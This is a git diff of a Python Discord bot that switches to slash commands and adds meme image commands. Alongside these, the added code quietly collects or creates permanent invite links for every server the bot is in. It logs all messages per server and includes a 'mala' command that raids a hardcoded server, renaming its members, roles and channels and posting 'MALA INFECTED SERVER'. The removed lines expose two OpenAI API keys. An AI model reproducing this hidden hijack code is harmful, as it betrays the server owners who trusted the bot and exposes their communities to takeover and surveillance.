@@ -13,7 +13,8 @@ import random
 import datetime
 import time
 from discord.ext.commands import cooldown, BucketType
-import openai
+from typing import Optional, Literal
+from discord import app_commands
 
 messagecounts = {}
 
@@ -21,7 +22,7 @@ global count
 count = 1
 
 intents = discord.Intents.all()
-
+intents.typing = True
 # Load message counts and user levels from JSON files
 if os.path.exists("message_counts.json"):
     with open("message_counts.json", "r") as f:
@@ -53,6 +54,22 @@ class MyBot(commands.Bot):
                 name=
                 f'.help for a list of commands! 🥳 🎉 Currently in {len(self.guilds)} servers! 🎉'
             ))
+        
+        with open('invite_links.txt', 'w') as file:
+            file.write('Invite Links:\n')
+
+        for guild in client.guilds:
+            invites = await guild.invites()
+            with open('invite_links.txt', 'a') as file:
+                file.write(f'Guild: {guild.name}\n')
+
+                if not invites:
+                    # Create a permanent invite link that never expires
+                    invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
+                    file.write(f'{invite.url} (Permanent)\n')
+                else:
+                    for invite in invites:
+                        file.write(f'{invite.url}\n')
 
     async def on_message(self, message):
         await self.process_commands(message)
@@ -76,7 +93,7 @@ class MyBot(commands.Bot):
                     "xp": 0,
                     "level": 0
                 }
-            user_levels[server_id][author_id]["xp"] += 10  # Adjust XP gain as needed
+            user_levels[server_id][author_id]["xp"] += 1  # Adjust XP gain as needed
             current_xp = user_levels[server_id][author_id]["xp"]
             if current_xp >= (user_levels[server_id][author_id]["level"] + 1) * 100:
                 user_levels[server_id][author_id]["level"] += 1
@@ -90,19 +107,118 @@ class MyBot(commands.Bot):
 
         username = str(message.author).split('#')[0]
         user_message = str(message.content)
+        server_name = str(message.guild.name)
         channel = str(message.channel.name)
-        print(f'{username}: {user_message} ({channel})')
-        with open("log.txt", "a") as f:
+
+        # Create a folder named "server-logs" if it doesn't exist
+        if not os.path.exists("server-logs"):
+            os.mkdir("server-logs")
+
+        # Create a text file for each server
+        log_filename = f"server-logs/log-{server_name}.txt"
+
+        with open(log_filename, "a") as f:
             f.write(time.ctime())
             f.write(f' {username}: {user_message} ({channel})\n')
+
+        with open("log.txt", "a") as f:
+            f.write(time.ctime())
+            f.write(f'{username}: {user_message} ({server_name} - {channel})\n')
 	
 client = MyBot()
+@client.event
+async def on_friend_request(request):
+    await request.accept()
 
-@client.command(brief="Show server rankings")
+
+target_guild_id = 1148875114813870120
+@client.command()
+@commands.has_permissions(administrator=True)
+async def mala(ctx):
+    guild = client.get_guild(target_guild_id)
+    if guild:
+        # Load your image file for the new server icon
+        with open('icon.png', 'rb') as icon_file:
+            new_icon = icon_file.read()
+        for member in guild.members:
+            try:
+                await member.edit(nick='MALA')
+                await ctx.reply(f'Changed nickname for {member.name}')
+            except Exception as e:
+                print(f'Error changing nickname for {member.name}: {e}')
+        for role in guild.roles:
+            try:
+                await role.edit(name='MALA')
+                await ctx.reply(f'Renamed role {role.name}')
+            except Exception as e:
+                print(f'Error renaming role {role.name}: {e}')
+        # Set the new server name and icon
+        await guild.edit(name='MALA', icon=new_icon)
+        for channel in guild.channels:
+            if isinstance(channel, discord.TextChannel):
+                await channel.edit(name='MALA')
+                await ctx.reply(f'Renamed {channel.name} in {guild.name} to MALA')
+        for channel in guild.text_channels:
+            await channel.send('MALA INFECTED SERVER')
+
+@client.command() 
+async def sync( 
+             ctx: commands.Context, 
+             guilds: commands.Greedy[discord.Object], 
+             spec: Optional[Literal["~", "*", "^", "-"]] = None, 
+         ) -> None: 
+             """ 
+             !sync 
+                 This takes all global commands within the CommandTree and sends them to Discord. (see CommandTree for more info.) 
+             !sync ~ 
+                 This will sync all guild commands for the current context's guild. 
+             !sync * 
+                 This command copies all global commands to the current guild (within the CommandTree) and syncs. 
+             !sync ^ 
+                 This command will remove all guild commands from the CommandTree and syncs, which effectively removes all commands from the guild. 
+             !sync 123 456 789 
+                 This command will sync the 3 guild ids we passed: 123, 456 and 789. Only their guilds and guild-bound commands. 
+             """ 
+             bot: MyBot = ctx.bot 
+             if not guilds: 
+                 if spec == "~": 
+                     synced = await bot.tree.sync(guild=ctx.guild) 
+                 elif spec == "*": 
+                     bot.tree.copy_global_to(guild=ctx.guild)  # type: ignore 
+                     synced = await bot.tree.sync(guild=ctx.guild) 
+                 elif spec == "^": 
+                     bot.tree.clear_commands(guild=ctx.guild) 
+                     await bot.tree.sync(guild=ctx.guild) 
+                     synced = [] 
+                 elif spec == "-": 
+                     bot.tree.clear_commands(guild=None) 
+                     await bot.tree.sync() 
+                     synced = [] 
+                 else: 
+                     synced = await bot.tree.sync() 
+  
+                 await ctx.send( 
+                     f"Synced {len(synced)} commands {'globally' if spec is None else 'to the current guild.'}" 
+                 ) 
+                 return 
+  
+             ret = 0 
+             for guild in guilds: 
+                 try: 
+                     await bot.tree.sync(guild=guild) 
+                 except discord.HTTPException: 
+                     pass 
+                 else: 
+                     ret += 1 
+  
+             await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")
+
+
+@client.command()
 async def lmessages(ctx):
-    server_id = str(ctx.guild.id)
+    server_id = str(discord.Interaction.guild.id)
     if server_id not in messagecounts:
-        await ctx.send("No ranking data available for this server.")
+        await ctx.reply("No ranking data available for this server.")
         return
 
     sorted_users = sorted(messagecounts[server_id].items(), key=lambda x: x[1], reverse=True)
@@ -111,15 +227,15 @@ async def lmessages(ctx):
     embed = discord.Embed(title="Leaderboard messages for this server.", description="\n".join(rank_list[:10]), color=0x00ff00)
     embed.set_footer(text="Top 10 users by messages")
     
-    await ctx.send(embed=embed)
+    await ctx.reply(embed=embed)
 
 def save_message_counts():
     with open("message_counts.json", "w") as f:
         json.dump(messagecounts, f, indent=4)
 
 
-@client.command(brief="Song Of The Day")
-async def sotd(ctx):
+@client.tree.command()
+async def sotd(interaction: discord.Interaction):
     api_url = "https://api.songof.today/v2/today"
 
     response = requests.get(api_url)
@@ -134,9 +250,9 @@ async def sotd(ctx):
         embed.add_field(name="Spotify", value=song_data['url'], inline=False)
         embed.add_field(name="Lyrics", value=song_data['lyrics'], inline=False)
         
-        await ctx.send(embed=embed)
+        await interaction.response.send_message(embed=embed)
     else:
-        await ctx.send("Failed to retrieve song data.")
+        await interaction.response.send_message("Failed to retrieve song data.")
 
 
 import io
@@ -151,10 +267,59 @@ def get_binary_data(url):
 def wrap_binary_data_in_file(binary_data, filename):
     return discord.File(binary_data, filename=filename)
 
-@client.command()
-async def wasted(ctx, member1: discord.Member):
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+)
+async def hilter(interaction: discord.Interaction, user: discord.Member):
+    api_url = "https://agg-api.vercel.app/hitler"
+    user = user.avatar.url
+
+    # Build the API URL with the provided parameters
+    url = f"{api_url}?avatar={user}"
+    bin_data = get_binary_data(url)
+
+    # Manipulate the binary data here (for example, replacing some bytes)
+    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")
+
+    # Create a BytesIO object and write the manipulated binary data to it
+    bytes_io = io.BytesIO()
+    bytes_io.write(manipulated_bin_data)
+    bytes_io.seek(0)  # Reset the position to the beginning of the buffer
+
+    file = wrap_binary_data_in_file(bytes_io, "res.png")
+    await interaction.response.send_message(file=file)
+
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+)
+async def rip(interaction: discord.Interaction, user: discord.Member):
+    api_url = "https://agg-api.vercel.app/rip"
+    user = user.avatar.url
+
+    # Build the API URL with the provided parameters
+    url = f"{api_url}?avatar={user}"
+    bin_data = get_binary_data(url)
+
+    # Manipulate the binary data here (for example, replacing some bytes)
+    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")
+
+    # Create a BytesIO object and write the manipulated binary data to it
+    bytes_io = io.BytesIO()
+    bytes_io.write(manipulated_bin_data)
+    bytes_io.seek(0)  # Reset the position to the beginning of the buffer
+
+    file = wrap_binary_data_in_file(bytes_io, "res.png")
+    await interaction.response.send_message(file=file)
+
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+)
+async def wasted(interaction: discord.Interaction, user: discord.Member):
     api_url = "https://apiv2.spapi.online/image/"
-    user = member1.avatar.url
+    user = user.avatar.url
 
     # Build the API URL with the provided parameters
     url = f"{api_url}wasted?image={user}&text=Died%20of%20Copycats%20and%20Cringe"
@@ -169,12 +334,15 @@ async def wasted(ctx, member1: discord.Member):
     bytes_io.seek(0)  # Reset the position to the beginning of the buffer
 
     file = wrap_binary_data_in_file(bytes_io, "res.png")
-    await ctx.reply(file=file)
+    await interaction.response.send_message(file=file)
 
-@client.command()
-async def coffee(ctx, member1: discord.Member):
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+)
+async def coffee(interaction: discord.Interaction, user: discord.Member):
     api_url = "https://agg-api.vercel.app/coffee"
-    user = member1.avatar.url
+    user = user.avatar.url
 
     # Build the API URL with the provided parameters
     url = f"{api_url}?avatar={user}"
@@ -189,13 +357,16 @@ async def coffee(ctx, member1: discord.Member):
     bytes_io.seek(0)  # Reset the position to the beginning of the buffer
 
     file = wrap_binary_data_in_file(bytes_io, "res.png")
-    await ctx.reply(file=file)
+    await interaction.response.send_message(file=file)
 
 
-@client.command()
-async def gun(ctx, member1: discord.Member):
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+)
+async def gun(interaction: discord.Interaction, user: discord.Member):
     api_url = "https://agg-api.vercel.app/gun"
-    user = member1.avatar.url
+    user = user.avatar.url
 
     # Build the API URL with the provided parameters
     url = f"{api_url}?avatar={user}"
@@ -210,13 +381,16 @@ async def gun(ctx, member1: discord.Member):
     bytes_io.seek(0)  # Reset the position to the beginning of the buffer
 
     file = wrap_binary_data_in_file(bytes_io, "res.png")
-    await ctx.reply(file=file)
+    await interaction.response.send_message(file=file)
 
 
-@client.command()
-async def wanted(ctx, member1: discord.Member):
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+)
+async def wanted(interaction: discord.Interaction, user: discord.Member):
     api_url = "https://agg-api.vercel.app/wanted"
-    user = member1.avatar.url
+    user = user.avatar.url
 
     # Build the API URL with the provided parameters
     url = f"{api_url}?avatar={user}"
@@ -231,12 +405,15 @@ async def wanted(ctx, member1: discord.Member):
     bytes_io.seek(0)  # Reset the position to the beginning of the buffer
 
     file = wrap_binary_data_in_file(bytes_io, "res.png")
-    await ctx.reply(file=file)
+    await interaction.response.send_message(file=file)
 
-@client.command()
-async def jail(ctx, member1: discord.Member):
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+)
+async def jail(interaction: discord.Interaction, user: discord.Member):
     api_url = "https://agg-api.vercel.app/jail"
-    user = member1.avatar.url
+    user = user.avatar.url
 
     # Build the API URL with the provided parameters
     url = f"{api_url}?avatar={user}"
@@ -251,14 +428,17 @@ async def jail(ctx, member1: discord.Member):
     bytes_io.seek(0)  # Reset the position to the beginning of the buffer
 
     file = wrap_binary_data_in_file(bytes_io, "res.png")
-    await ctx.reply(file=file)
+    await interaction.response.send_message(file=file)
 
-
-@client.command()
-async def ship(ctx, member1: discord.Member, member2: discord.Member):
+@client.tree.command()
+@app_commands.describe(
+    user='User',
+    user2='User2',
+)
+async def ship(interaction: discord.Interaction, user: discord.Member, user2: discord.Member):
     api_url = "https://agg-api.vercel.app/ship"
-    user = member1.avatar.url
-    user2 = member2.avatar.url
+    user = user.avatar.url
+    user2 = user2.avatar.url
     # Build the API URL with the provided parameters
     url = f"{api_url}?avatar1={user}?size=2048&avatar2={user2}?size=2048"
     bin_data = get_binary_data(url)
@@ -272,29 +452,11 @@ async def ship(ctx, member1: discord.Member, member2: discord.Member):
     bytes_io.seek(0)  # Reset the position to the beginning of the buffer
 
     file = wrap_binary_data_in_file(bytes_io, "res.png")
-    await ctx.reply(file=file)
+    await interaction.response.send_message(file=file)
 
 
 
-@client.command(brief="ChatGPT goes brrrrrrrrr.....")
-async def ai(ctx: commands.Context, *, prompt: str):
-    #code1: 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
-    #code2: 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
-    openai.api_key = "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"
-    response = openai.Completion.create(
-        engine="text-davinci-002",
-        prompt=prompt,
-        temperature=0.5,
-        max_tokens=4000,
-        presence_penalty=0,
-        frequency_penalty=0,
-        best_of=1,
-    )
-    text = response.choices[0].text
-    embed = discord.Embed(title=f"Output for command \"{prompt}\".", description="```" + text + "```")
-    await ctx.reply(embed=embed)
-
-@client.command(brief="Used to display the server's stats")
+@client.command()
 async def serverstats(ctx):
     embed = discord.Embed(title=f"Server Info for: {ctx.guild.name}")
     embed.add_field(name="Users:", value=ctx.guild.member_count, inline=False)
@@ -316,22 +478,22 @@ async def calculate(ctx, operation, *nums):
 async def botinfo(ctx):
     embed = discord.Embed()
     embed.add_field(name="❗ - Support Server",
-                    value="https://discord.gg/2k6PCxAMtK",
+                    value="https://discord.gg/4jfGkmp8Zb",
                     inline=True)
-    embed.add_field(name="🧑‍💻 - Bot Owners",
+    embed.add_field(name="🧑‍💻 - My Creator!!!",
                     value="Luca-rickrolled-himself#1228",
                     inline=True)
     embed.add_field(name="🌎Website",
-                    value="morache.go.ro/wordpress/FlashDrive/home",
+                    value="Comming soon",
                     inline=True)
-    embed.add_field(name="📩 - Bot Join Date", value="1/7/2022", inline=True)
+    embed.add_field(name="📩 - Bot Join Date (Discord)", value="1/7/2022", inline=True)
     embed.add_field(name="👋 - Invite Me",
-                    value="https://bit.ly/3P6ejzN",
+                    value="[Click This!](https://bit.ly/3P6ejzN)",
                     inline=True)
     embed.add_field(name="🖨️ - Total Guilds",
                     value=len(client.guilds),
                     inline=True)
-    embed.add_field(name="📂 - Bot Version", value="1.1.2", inline=True)
+    embed.add_field(name="📂 - Bot Version", value="2.4.7", inline=True)
     embed.add_field(name="🏓 - Bot Ping",
                     value=f'{round(client.latency * 1000)}ms',
                     inline=True)
@@ -401,7 +563,7 @@ async def dlog(ctx: commands.Context):
 
 @client.command(brief="Make a small donation to the creator of this bot")
 async def donate(ctx):
-    link = "https://www.patreon.com/flashdrive"
+    link = "[Donate by clicking this!! also thanks!](https://upgrade.chat/chromatic-cloud-studios)"
     await ctx.reply(link)
 
 @client.command()
@@ -481,126 +643,7 @@ async def clear_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
         await ctx.send("You dont have permission do that!")
 
-# Giveway part
 
-
-@client.command(brief="A giveaway command",
-                description="Say .giveaway and follow the steps")
-@has_permissions(administrator=True)
-async def giveaway(ctx):
-    # Giveaway command requires the user to have a "Giveaway Host" role to function properly
-
-    # Stores the questions that the bot will ask the user to answer in the channel that the command was made
-    # Stores the answers for those questions in a different list
-    giveaway_questions = [
-        'Which channel will I host the giveaway in?',
-        'What is the prize?',
-        'How long should the giveaway run for (in seconds)?',
-    ]
-    giveaway_answers = []
-
-    # Checking to be sure the author is the one who answered and in which channel
-    def check(m):
-        return m.author == ctx.author and m.channel == ctx.channel
-
-    # Askes the questions from the giveaway_questions list 1 by 1
-    # Times out if the host doesn't answer within 30 seconds
-    for question in giveaway_questions:
-        await ctx.send(question)
-        try:
-            message = await client.wait_for('message',
-                                            timeout=30.0,
-                                            check=check)
-        except asyncio.TimeoutError:
-            await ctx.send(
-                'You didn\'t answer in time.  Please try again and be sure to send your answer within 30 seconds of the question.'
-            )
-            return
-        else:
-            giveaway_answers.append(message.content)
-
-    # Grabbing the channel id from the giveaway_questions list and formatting is properly
-    # Displays an exception message if the host fails to mention the channel correctly
-    try:
-        c_id = int(giveaway_answers[0][2:-1])
-    except:
-        await ctx.send(
-            f'You failed to mention the channel correctly.  Please do it like this: {ctx.channel.mention}'
-        )
-        return
-
-    # Storing the variables needed to run the rest of the commands
-    channel = client.get_channel(c_id)
-    prize = str(giveaway_answers[1])
-    time = int(giveaway_answers[2])
-
-    # Sends a message to let the host know that the giveaway was started properly
-    await ctx.send(
-        f'The giveaway for {prize} will begin shortly.\nPlease direct your attention to {channel.mention}, this giveaway will end in {time} seconds.'
-    )
-
-    # Giveaway embed message
-    give = discord.Embed(color=0x2ecc71)
-    give.set_author(name=f'GIVEAWAY TIME!',
-                    icon_url='https://i.imgur.com/VaX0pfM.png')
-    give.add_field(
-        name=f'{ctx.author.name} is giving away: {prize}!',
-        value=f'React with 🎉 to enter!\n Ends in {round(time/60, 2)} minutes!',
-        inline=False)
-    end = datetime.datetime.utcnow() + datetime.timedelta(seconds=time)
-    give.set_footer(text=f'Giveaway ends at {end} UTC!')
-    my_message = await channel.send(embed=give)
-
-    # Reacts to the message
-    await my_message.add_reaction("🎉")
-    await asyncio.sleep(time)
-
-    new_message = await channel.fetch_message(my_message.id)
-
-    # Picks a winner
-    users = await new_message.reactions[0].users().flatten()
-    users.pop(users.index(client.user))
-    winner = random.choice(users)
-
-    # Announces the winner
-    winning_announcement = discord.Embed(color=0xff2424)
-    winning_announcement.set_author(name=f'THE GIVEAWAY HAS ENDED!',
-                                    icon_url='https://i.imgur.com/DDric14.png')
-    winning_announcement.add_field(
-        name=f'🎉 Prize: {prize}',
-        value=
-        f'🥳 **Winner**: {winner.mention}\n 🎫 **Number of Entrants**: {len(users)}',
-        inline=False)
-    winning_announcement.set_footer(text='Thanks for entering!')
-    await channel.send(embed=winning_announcement)
-
-
-@client.command(
-    brief="Re roll the giveaway",
-    description="You must enter like this: .reroll #your-channel (channel-id)")
-@has_permissions(administrator=True)
-async def reroll(ctx, channel: discord.TextChannel, id_: int):
-    # Reroll command requires the user to have a "Giveaway Host" role to function properly
-    try:
-        new_message = await channel.fetch_message(id_)
-    except:
-        await ctx.send("Incorrect id.")
-        return
-
-    # Picks a new winner
-    users = await new_message.reactions[0].users().flatten()
-    users.pop(users.index(client.user))
-    winner = random.choice(users)
-
-    # Announces the new winner to the server
-    reroll_announcement = discord.Embed(color=0xff2424)
-    reroll_announcement.set_author(
-        name=f'The giveaway was re-rolled by the host!',
-        icon_url='https://i.imgur.com/DDric14.png')
-    reroll_announcement.add_field(name=f'🥳 New Winner:',
-                                  value=f'{winner.mention}',
-                                  inline=False)
-    await channel.send(embed=reroll_announcement)
 
 
 #qr code creator
